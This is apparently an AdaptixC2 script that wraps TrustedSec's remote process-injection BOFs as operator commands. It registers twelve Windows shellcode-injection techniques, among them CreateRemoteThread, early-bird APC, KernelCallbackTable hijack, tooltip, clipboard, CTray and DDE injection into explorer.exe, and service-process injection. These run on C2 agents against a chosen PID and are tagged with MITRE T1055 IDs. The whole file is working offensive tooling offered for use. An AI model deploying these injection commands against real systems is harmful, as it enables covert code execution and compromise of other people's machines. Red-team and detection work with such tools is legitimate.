// ============================================================
// TrustedSec CS-Remote-OPs-BOF — Injection AXS
// Original: https://github.com/trustedsec/CS-Remote-OPs-BOF
// Source CNA: Injection/Injection.cna
//
// Place this file at: <repo>/Injection/TrustedSec-Remote-Injection.axs
// BOF layout: <bofname>/<bofname>.<arch>.o
// ============================================================

function execBof(id, cmdline, bofname, args, msg, ttp) {
    let bof_path = ax.script_dir() + bofname + "/" + bofname + "." + ax.arch(id) + ".o";
    let task_msg = (msg && msg !== "") ? msg : "Tasked agent to run " + bofname + " BOF";
    if (ttp && ttp !== "") task_msg += " (" + ttp + ")";
    let exec_cmd = args ? `execute bof "${bof_path}" ${args}` : `execute bof "${bof_path}"`;
    ax.execute_alias(id, cmdline, exec_cmd, task_msg);
}

// createremotethread
let createremotethread_cmd = ax.create_command(
    "createremotethread",
    "Inject shellcode using CreateRemoteThread.",
    "createremotethread <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
createremotethread_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
createremotethread_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
createremotethread_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "createremotethread", args,
        `Injecting shellcode into PID ${pid} via CreateRemoteThread`, "T1055.003");
});

// setthreadcontext
let setthreadcontext_cmd = ax.create_command(
    "setthreadcontext",
    "Inject shellcode using SetThreadContext.",
    "setthreadcontext <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
setthreadcontext_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
setthreadcontext_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
setthreadcontext_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "setthreadcontext", args,
        `Injecting shellcode into PID ${pid} via SetThreadContext`, "T1055.003");
});

// ntcreatethread
let ntcreatethread_cmd = ax.create_command(
    "ntcreatethread",
    "Inject shellcode using NtCreateThread.",
    "ntcreatethread <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
ntcreatethread_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
ntcreatethread_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
ntcreatethread_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "ntcreatethread", args,
        `Injecting shellcode into PID ${pid} via NtCreateThread`, "T1055.003");
});

// ntqueueapcthread
let ntqueueapcthread_cmd = ax.create_command(
    "ntqueueapcthread",
    "Inject shellcode using NtQueueApcThread (Early Bird).",
    "ntqueueapcthread <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
ntqueueapcthread_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
ntqueueapcthread_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
ntqueueapcthread_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "ntqueueapcthread", args,
        `Injecting shellcode into PID ${pid} via NtQueueApcThread`, "T1055.004");
});

// kernelcallbacktable
let kernelcallbacktable_cmd = ax.create_command(
    "kernelcallbacktable",
    "Inject shellcode via KernelCallbackTable hijack (requires GUI process).",
    "kernelcallbacktable <pid> <shellcode_file>"
);
kernelcallbacktable_cmd.addArgInt("pid", true, "target GUI process PID");
kernelcallbacktable_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
kernelcallbacktable_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "kernelcallbacktable", args,
        `Injecting shellcode into PID ${pid} via KernelCallbackTable`, "T1055.013");
});

// tooltip
let tooltip_cmd = ax.create_command(
    "tooltip",
    "Inject shellcode via tooltip window message.",
    "tooltip <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
tooltip_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
tooltip_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
tooltip_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "tooltip", args,
        `Injecting shellcode into PID ${pid} via Tooltip`, "T1055");
});

// uxsubclassinfo — targets explorer.exe, no PID
let uxsubclassinfo_cmd = ax.create_command(
    "uxsubclassinfo",
    "Inject shellcode via UxSubclassInfo (targets explorer.exe).",
    "uxsubclassinfo <shellcode_file>"
);
uxsubclassinfo_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
uxsubclassinfo_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("bytes", [shellcode]);
    execBof(id, cmdline, "uxsubclassinfo", args,
        "Injecting shellcode via UxSubclassInfo into explorer.exe", "T1055");
});

// clipboardinject
let clipboardinject_cmd = ax.create_command(
    "clipboardinject",
    "Inject shellcode via WM_CLIPBOARDUPDATE message.",
    "clipboardinject <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
clipboardinject_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
clipboardinject_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
clipboardinject_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "clipboardinject", args,
        `Injecting shellcode into PID ${pid} via Clipboard`, "T1055");
});

// conhost
let conhost_cmd = ax.create_command(
    "conhost",
    "Inject shellcode via conhost.exe console host technique.",
    "conhost <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
);
conhost_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
conhost_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
conhost_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "conhost", args,
        `Injecting shellcode into PID ${pid} via ConHost`, "T1055");
});

// ctray — targets explorer.exe, no PID
let ctray_cmd = ax.create_command(
    "ctray",
    "Inject shellcode via CTray system tray (targets explorer.exe).",
    "ctray <shellcode_file>"
);
ctray_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
ctray_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("bytes", [shellcode]);
    execBof(id, cmdline, "ctray", args,
        "Injecting shellcode via CTray into explorer.exe", "T1055");
});

// dde — targets explorer.exe, no PID, fires 4 times
let dde_cmd = ax.create_command(
    "dde",
    "Inject shellcode via DDE (targets explorer.exe, fires 4 times).",
    "dde <shellcode_file>"
);
dde_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
dde_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("bytes", [shellcode]);
    execBof(id, cmdline, "dde", args,
        "Injecting shellcode via DDE into explorer.exe (x4)", "T1055,T1559.002");
});

// svcctrl
let svcctrl_cmd = ax.create_command(
    "svcctrl",
    "Inject shellcode into a service-hosting process via service control manager.",
    "svcctrl <pid> <shellcode_file>"
);
svcctrl_cmd.addArgInt("pid", true, "target service process PID");
svcctrl_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
svcctrl_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode = parsed_json["shellcode_file"];
    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
    execBof(id, cmdline, "svcctrl", args,
        `Injecting shellcode into service PID ${pid} via SvcCtrl`, "T1055");
});

// ── Registration ────────────────────────────────────────────

let group = ax.create_commands_group("TrustedSec-Remote-Injection", [
    createremotethread_cmd, setthreadcontext_cmd, ntcreatethread_cmd,
    ntqueueapcthread_cmd, kernelcallbacktable_cmd, tooltip_cmd,
    uxsubclassinfo_cmd, clipboardinject_cmd, conhost_cmd,
    ctray_cmd, dde_cmd, svcctrl_cmd
]);

ax.register_commands_group(group, ["beacon", "gopher", "kharon", "CrystalForge"], ["windows"], []);
